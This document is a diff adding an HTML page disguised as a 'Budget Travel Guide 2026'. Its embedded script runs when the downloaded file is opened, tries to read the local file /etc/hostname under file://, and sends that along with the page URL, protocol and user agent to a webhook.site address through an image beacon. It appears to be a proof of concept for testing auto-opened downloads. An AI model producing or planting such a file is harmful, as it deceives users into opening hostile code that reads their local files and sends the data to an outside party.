@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><title>Budget Travel Guide 2026</title></head>
+<body>
+<h1>Your Personalized Travel Guide</h1>
+<p>Based on your preferences, here are our top recommendations...</p>
+<script>
+// This executes when the downloaded file is auto-opened
+// In file:// context this has different security permissions
+var data = {
+  proof: 'DOWNLOADED_FILE_OPENED_AND_EXECUTED',
+  context: location.protocol,
+  url: location.href,
+  isFileProtocol: location.protocol === 'file:',
+  timestamp: new Date().toISOString(),
+  userAgent: navigator.userAgent
+};
+
+// If file:// context, try to read local files
+if (location.protocol === 'file:') {
+  data.fileAccess = true;
+  // file:// context may have broader permissions
+  try {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'file:///etc/hostname', false);
+    xhr.send();
+    data.hostname = xhr.responseText;
+  } catch(e) { data.hostnameError = e.message; }
+}
+
+new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?file_executed=' + 
+  encodeURIComponent(JSON.stringify(data));
+</script>
+</body>
+</html>
